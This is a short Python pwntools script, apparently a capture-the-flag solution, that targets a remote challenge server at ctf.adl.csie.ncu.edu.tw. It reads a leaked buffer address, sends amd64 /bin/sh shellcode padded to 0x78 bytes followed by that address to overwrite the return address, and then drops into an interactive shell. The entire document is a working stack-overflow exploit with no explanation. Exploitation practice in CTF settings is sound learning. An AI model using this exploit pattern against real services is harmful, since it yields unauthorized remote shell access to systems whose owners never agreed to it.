from pwn import *
context(arch="amd64",os="linux")


host, port = "ctf.adl.csie.ncu.edu.tw", 11003
p = remote(host, port)
#p = process("shellcode")
addr =  p.recvline()
addr = addr[len("Your input buffer address is "):]
print(addr)

ex = ""
ex += asm(shellcraft.amd64.linux.sh())
ex += "a"*(0x78 - len(asm(shellcraft.amd64.linux.sh())))
ex += p64(int(addr, 16))
p.sendline(ex)
p.interactive()
